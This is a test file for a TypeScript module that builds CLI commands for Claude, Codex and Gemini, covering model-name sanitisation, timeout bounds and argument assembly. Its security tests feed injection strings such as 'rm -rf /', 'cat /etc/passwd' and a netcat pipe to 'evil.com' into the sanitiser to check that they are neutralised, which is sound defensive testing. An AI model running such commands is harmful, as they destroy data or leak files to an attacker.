/**
 * Co-located tests for commands.ts
 */
import { describe, it, expect } from 'vitest';
import {
  buildClaudeCommand,
  buildCodexCommand,
  buildGeminiCommand,
  sanitiseModelName,
  validateTimeout,
} from './commands.js';

describe('commands exports', () => {
  it('exports buildClaudeCommand', () => expect(buildClaudeCommand).toBeDefined());
  it('exports buildCodexCommand', () => expect(buildCodexCommand).toBeDefined());
  it('exports buildGeminiCommand', () => expect(buildGeminiCommand).toBeDefined());
});

describe('sanitiseModelName security', () => {
  it('strips shell metacharacters (;, &, |, /, spaces)', () => {
    // Semicolon, spaces, slashes stripped; hyphens preserved
    expect(sanitiseModelName('model; rm -rf /')).toBe('modelrm-rf');
    expect(sanitiseModelName('model && cat /etc/passwd')).toBe('modelcatetcpasswd');
    expect(sanitiseModelName('model | nc evil.com 1234')).toBe('modelncevil.com1234');
  });

  it('preserves hyphens (valid in model names) but strips spaces', () => {
    expect(sanitiseModelName('model --extra-flag')).toBe('model--extra-flag');
    expect(sanitiseModelName('model -x')).toBe('model-x');
  });

  it('strips newline characters', () => {
    expect(sanitiseModelName('model\n--malicious-flag')).toBe('model--malicious-flag');
    expect(sanitiseModelName('model\r\n--flag')).toBe('model--flag');
  });

  it('allows safe characters (alphanumeric, dots, hyphens, underscores, colons)', () => {
    expect(sanitiseModelName('gpt-5.2-codex')).toBe('gpt-5.2-codex');
    expect(sanitiseModelName('gemini-2.5-pro-exp-03-25')).toBe('gemini-2.5-pro-exp-03-25');
    expect(sanitiseModelName('gpt-oss:120b-cloud')).toBe('gpt-oss:120b-cloud');
    expect(sanitiseModelName('model_name_v2')).toBe('model_name_v2');
  });

  it('truncates excessively long model names', () => {
    const longName = 'a'.repeat(200);
    expect(sanitiseModelName(longName).length).toBe(100);
  });
});

describe('validateTimeout bounds', () => {
  it('clamps below minimum (5s) to minimum', () => {
    expect(validateTimeout(1000)).toBe(5000);
    expect(validateTimeout(0)).toBe(5000);
    expect(validateTimeout(-1000)).toBe(5000);
  });

  it('clamps above maximum (5min) to maximum', () => {
    expect(validateTimeout(600000)).toBe(300000);
    expect(validateTimeout(1000000)).toBe(300000);
  });

  it('allows values within bounds', () => {
    expect(validateTimeout(30000)).toBe(30000);
    expect(validateTimeout(120000)).toBe(120000);
    expect(validateTimeout(5000)).toBe(5000);
    expect(validateTimeout(300000)).toBe(300000);
  });
});

describe('buildClaudeCommand', () => {
  it('builds basic command with prompt only', () => {
    const result = buildClaudeCommand({ prompt: 'test prompt' });

    expect(result.binary).toBe('claude');
    expect(result.args).toEqual(['--print', 'test prompt']);
    expect(result.timeout).toBe(30000);
  });

  it('includes model when provided', () => {
    const result = buildClaudeCommand({
      prompt: 'test',
      model: 'claude-opus-4'
    });

    expect(result.args).toContain('--model');
    expect(result.args).toContain('claude-opus-4');
  });

  it('sanitises model name', () => {
    const result = buildClaudeCommand({
      prompt: 'test',
      model: 'model;injection'
    });

    expect(result.args).toContain('modelinjection');
  });

  it('includes style content as system prompt', () => {
    const result = buildClaudeCommand({
      prompt: 'test',
      styleContent: 'Be concise'
    });

    expect(result.args).toContain('--system-prompt');
    expect(result.args).toContain('Be concise');
  });

  it('includes agent content as appended system prompt', () => {
    const result = buildClaudeCommand({
      prompt: 'test',
      agentContent: 'Expert mode'
    });

    expect(result.args).toContain('--append-system-prompt');
    expect(result.args).toContain('Expert mode');
  });

  it('combines all options correctly', () => {
    const result = buildClaudeCommand({
      prompt: 'test',
      model: 'claude-sonnet-4',
      styleContent: 'Concise',
      agentContent: 'Expert'
    });

    expect(result.args).toEqual([
      '--print', 'test',
      '--model', 'claude-sonnet-4',
      '--system-prompt', 'Concise',
      '--append-system-prompt', 'Expert'
    ]);
  });
});

describe('buildCodexCommand', () => {
  it('builds basic command with prompt only', () => {
    const result = buildCodexCommand({ prompt: 'test prompt' });

    expect(result.binary).toBe('codex');
    expect(result.args).toEqual(['exec', 'test prompt']);
    expect(result.timeout).toBe(120000);
  });

  it('includes model when provided', () => {
    const result = buildCodexCommand({
      prompt: 'test',
      model: 'gpt-5-codex'
    });

    expect(result.args).toContain('--model');
    expect(result.args).toContain('gpt-5-codex');
  });

  it('sanitises model name', () => {
    const result = buildCodexCommand({
      prompt: 'test',
      model: 'model;bad'
    });

    expect(result.args).toContain('modelbad');
  });

  it('includes --oss flag when oss is true', () => {
    const result = buildCodexCommand({
      prompt: 'test',
      oss: true
    });

    expect(result.args).toContain('--oss');
  });

  it('omits --oss flag when oss is false', () => {
    const result = buildCodexCommand({
      prompt: 'test',
      oss: false
    });

    expect(result.args).not.toContain('--oss');
  });

  it('uses slow provider timeout (2 minutes)', () => {
    const result = buildCodexCommand({ prompt: 'test' });

    expect(result.timeout).toBe(120000);
  });
});

describe('buildGeminiCommand', () => {
  it('builds basic command with prompt only', () => {
    const result = buildGeminiCommand({ prompt: 'test prompt' });

    expect(result.binary).toBe('gemini');
    expect(result.args).toEqual(['test prompt', '--debug']);
    expect(result.timeout).toBe(120000);
  });

  it('includes model when provided', () => {
    const result = buildGeminiCommand({
      prompt: 'test',
      model: 'gemini-2.5-pro'
    });

    expect(result.args).toContain('--model');
    expect(result.args).toContain('gemini-2.5-pro');
  });

  it('sanitises model name', () => {
    const result = buildGeminiCommand({
      prompt: 'test',
      model: 'gemini;injection'
    });

    expect(result.args).toContain('geminiinjection');
  });

  it('always includes --debug flag', () => {
    const result = buildGeminiCommand({ prompt: 'test' });

    expect(result.args).toContain('--debug');
  });

  it('uses slow provider timeout (2 minutes)', () => {
    const result = buildGeminiCommand({ prompt: 'test' });

    expect(result.timeout).toBe(120000);
  });
});
